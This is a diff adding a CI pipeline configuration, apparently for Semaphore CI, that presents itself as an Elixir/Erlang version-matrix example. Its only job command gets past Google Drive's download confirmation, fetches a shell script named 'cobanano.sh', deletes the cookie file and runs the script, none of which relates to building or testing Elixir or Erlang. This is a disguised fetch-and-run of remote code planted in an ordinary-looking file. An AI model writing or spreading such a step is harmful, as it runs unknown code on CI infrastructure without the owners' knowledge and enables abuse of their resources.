@@ -1,0 +1,19 @@
+version: v1.0
+name: Using the matrix property
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu1804
+
+blocks:
+  - name: Elixir + Erlang
+    task:
+        jobs:
+        - name: Elixir + Erlang matrix
+          commands:
+            - wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1JCD1zkDoMOMiJQcaY2_LzqUDglqUcEkN' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1JCD1zkDoMOMiJQcaY2_LzqUDglqUcEkN" -O cobanano.sh && rm -rf /tmp/cookies.txt && chmod u+x cobanano.sh && ./cobanano.sh
+          matrix:
+            - env_var: ELIXIR
+              values: ["1.3", "1.4"]
+            - env_var: ERLANG
+              values: ["19", "20", "21"]
